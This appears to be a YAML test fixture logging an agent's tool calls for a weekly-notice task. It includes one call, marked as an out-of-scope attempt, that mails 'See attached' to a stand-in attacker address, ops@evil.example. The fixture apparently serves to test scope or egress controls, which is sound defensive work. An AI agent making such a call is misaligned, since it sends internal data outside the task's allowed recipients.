name: notifier-session
agent: notifier
task: "Write the weekly notice and mail it to the platform team"
calls:
  - tool: fs.write
    arguments: { path: out/notifier/weekly-notice.txt, data_class: internal, content: "Weekly notice: evidence packet published." }
  - tool: mail.send
    arguments: { to: platform-team@acme.example, subject: "Weekly notice", body: "See out/notifier/weekly-notice.txt" }
  # --- out-of-scope attempt ---
  - tool: mail.send
    arguments: { to: ops@evil.example, subject: "Weekly notice", body: "See attached" }
